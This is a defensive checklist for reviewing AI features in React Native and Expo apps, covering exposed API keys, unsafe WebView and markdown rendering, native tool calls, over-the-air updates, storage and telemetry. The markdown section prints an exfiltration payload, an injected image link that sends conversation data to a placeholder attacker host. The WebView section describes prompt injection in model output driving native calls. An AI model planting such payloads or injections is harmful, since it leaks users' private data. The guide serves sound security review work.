# React Native & Expo: where AI apps fail

React Native AI apps fail review and get exploited in ways native apps rarely do:

- JavaScript-world habits (env files, web SDKs, `console.log`, `eval`, WebViews) are carried into an app binary that anyone can unpack.
- OTA updates tempt teams to ship features around review.

Each section maps to a check ID in [store-rejection.md](store-rejection.md) or [ai-security.md](ai-security.md).

## Secrets: everything in the bundle is public (MG-S01)

Build-time "env" mechanisms all end up in the shipped app:

| Mechanism | Where it ends up |
|---|---|
| `process.env.EXPO_PUBLIC_*` | Inlined as a string literal in the JS bundle by Metro. Expo's docs say not to put secrets here. |
| `react-native-config` (`Config.X`) | Compiled into Android `BuildConfig` and the iOS Info.plist |
| `app.config.*` → `extra` → `Constants.expoConfig.extra` | Embedded in the app manifest, and served publicly with EAS Update manifests |
| `eas.json` `env` / EAS env vars used at build | Inlined if referenced via `EXPO_PUBLIC_` or read in `app.config` |
| Hermes bytecode (`.hbc`) | Strings recoverable with `strings` or hermes-dec. Hermes is not obfuscation. |

**Tell-tale lead:** `new OpenAI({ dangerouslyAllowBrowser: true })` or `new Anthropic({ dangerouslyAllowBrowser: true })`. The SDK authors named the flag after this exact risk. It means a provider key is in client code.

**Not findings:**

- Expo Router **API routes** (`app/**/+api.ts`) run on the server when deployed (EAS Hosting or another server output). A key read there via a non-`EXPO_PUBLIC_` env var is the correct pattern. Confirm the client calls the route rather than the provider.
- Keys under `functions/`, `server/`, or `supabase/functions/`.

**Sanctioned client patterns:**

- Firebase AI Logic (`firebase/ai`, `@react-native-firebase/ai`) with App Check enforced (`@react-native-firebase/app-check`, using App Attest / Play Integrity providers rather than debug).
- Vercel AI SDK `useChat` with `fetch: expoFetch` pointed at your `+api` route.

## WebViews rendering model output (MG-S04, MG-S05, MG-R05)

`react-native-webview` defaults matter:

- `javaScriptEnabled` defaults to **true**.
- `window.ReactNativeWebView.postMessage` is injected into **every page the WebView loads**, including pages a generated link navigates to.

Risky configuration around model output:

- `source={{ html: modelOutput }}` with JS enabled: script injection, plus 2.5.2 exposure if the output acts as an app.
- `onMessage={e => handle(JSON.parse(e.nativeEvent.data))}` where `handle` does native work (contacts, payments, navigation, storage, tool calls). Prompt injection in the rendered content becomes a native call. Check whether the handler validates `e.nativeEvent.url` **and** allow-lists the message type.
- `originWhitelist={['*']}`, no `onShouldStartLoadWithRequest`, `allowFileAccess`, `allowUniversalAccessFromFileURLs`, `mixedContentMode="always"`.
- `injectJavaScript(\`...${modelOutput}...\`)` or `injectedJavaScript` built from model output: direct code execution (MG-R05 case 1).

**Fix pattern:** render chat as native `Text` or markdown. If HTML is unavoidable (math, charts), use `javaScriptEnabled={false}` or a fixed renderer page that receives data via `postMessage` and treats it as data, with `onShouldStartLoadWithRequest` returning false for every non-initial URL and no native bridge.

## Markdown renderers (MG-S04)

`react-native-markdown-display`, `react-native-marked`, `react-native-render-html`, and similar libraries:

- **Links:** default link handling opens URLs via `Linking.openURL`. Any scheme in model output fires: `tel:`, `sms:`, `mailto:`, other apps' schemes, and **your own deep links**. Supply `onLinkPress` that allow-lists `https:` (and your hosts) and confirms before opening.
- **Images:** markdown images load automatically, so injected `![x](https://attacker/log?q=…)` exfiltrates conversation data with zero clicks. Disable images in model-output markdown, or allow-list the image host.
- **HTML passthrough:** `react-native-render-html` renders tags from output. Restrict them with `ignoredDomTags` / custom renderers.

## Tool calling with native modules (MG-S05)

The pattern: the AI SDK's `tools` with `execute`, or a manual `switch (call.name)`, calling Expo modules (`expo-contacts`, `expo-sms`, `expo-mail-composer`, `expo-calendar`, `expo-location`, `expo-media-library`, `expo-file-system`, `Linking`) or your API.

- Every side-effecting tool needs a confirmation step rendered in native UI, showing the exact recipient, amount, or content, *outside* the model's control.
- Read tools (contacts, location) feed sensitive data back to the provider (MG-S06) and need their own disclosure (MG-R01).
- Reflective dispatch (`tools[call.name](call.args)`) plus a tool registry larger than the feature needs is excessive agency.

## OTA updates and feature flags (MG-R06, MG-S11)

- **EAS Update / `expo-updates`:** fine for fixes and content. Shipping a new AI capability (a new tool, provider, or agent mode) as a JS-only update risks 2.5.2 and the license agreement's interpreted-code limits.
  - Configure **code signing** (`updates.codeSigningCertificate` + `codeSigningMetadata` in app.json), or a compromised update channel ships arbitrary JS to every user.
- **`react-native-code-push`:** Microsoft retired App Center (CodePush included) on 31 March 2025. Any remaining usage points to a self-hosted or third-party server. Verify who controls it and whether updates are signed.
- **Remote flags** (Firebase Remote Config, Statsig, LaunchDarkly, GrowthBook) that keep AI features off while `isReviewBuild`, or on only after approval, are hidden features under 2.3.1.

## Storage (MG-S07)

| API | Encrypted? | Use for |
|---|---|---|
| `@react-native-async-storage/async-storage` | No (plain SQLite/files) | Non-sensitive preferences only |
| `react-native-mmkv` | Only with `encryptionKey`, and only if that key comes from the Keychain | History, if encrypted |
| `expo-secure-store` / `react-native-keychain` | Yes (Keychain/Keystore) | BYOK keys and tokens. Keep values small and store an encryption key here, not whole histories. |
| `expo-file-system` documents | iOS data protection by default; included in backups | Generated media; exclude from backup if sensitive |

A BYOK API key in AsyncStorage is a High finding: it is readable from device backups and by anything with filesystem access on rooted or jailbroken devices.

## Logging and telemetry (MG-S08)

- `console.log(response)` survives in release Hermes builds unless `babel-plugin-transform-remove-console` (or equivalent) runs for production.
- `@sentry/react-native` records console calls as **breadcrumbs** by default, so a logged prompt is shipped to Sentry with the next error. Scrub it in `beforeBreadcrumb`.
- Reactotron, Flipper network plugins, and in-app network inspectors must be dev-only. Check the imports are guarded by `__DEV__`.

## Store declarations from Expo config (MG-R02, MG-R03, MG-R12)

- **iOS privacy manifest:** `expo.ios.privacyManifests` in app.json (SDK 50+) generates PrivacyInfo.xcprivacy at prebuild. Bare RN projects edit `ios/<App>/PrivacyInfo.xcprivacy` directly. Check both locations, since prebuild overwrites hand edits.
- **AI host in `NSPrivacyTrackingDomains`** is a Blocker (see MG-R02).
- **Purpose strings:** `expo.ios.infoPlist` (`NSMicrophoneUsageDescription`, `NSSpeechRecognitionUsageDescription` for `expo-speech-recognition` / `@react-native-voice/voice`, `NSPhotoLibraryUsageDescription`, `NSCameraUsageDescription`). Name AI processing in them.
- **Android permissions:** libraries add permissions automatically (`expo-av` adds `RECORD_AUDIO`, for example). Unused sensitive permissions trigger Play declaration requirements. Remove them with `expo.android.blockedPermissions`.

## Provider SDKs in React Native

- **`openai` / `@anthropic-ai/sdk` in RN:** running in the client requires `dangerouslyAllowBrowser`, so the client holds the key (MG-S01). Move the call to a `+api` route or backend.
- **Streaming:** the Vercel AI SDK in Expo uses `expo/fetch` for streaming. Polyfilled SSE libraries that retry forever are an MG-S02 loop risk.
- **On-device** (`llama.rn`, `react-native-executorch`, MLC, ONNX): no third-party data sharing (MG-R01 n/a if nothing else egresses), but MG-S11 applies to model downloads. Large downloads on cellular need user consent for UX; that is not a policy gate.
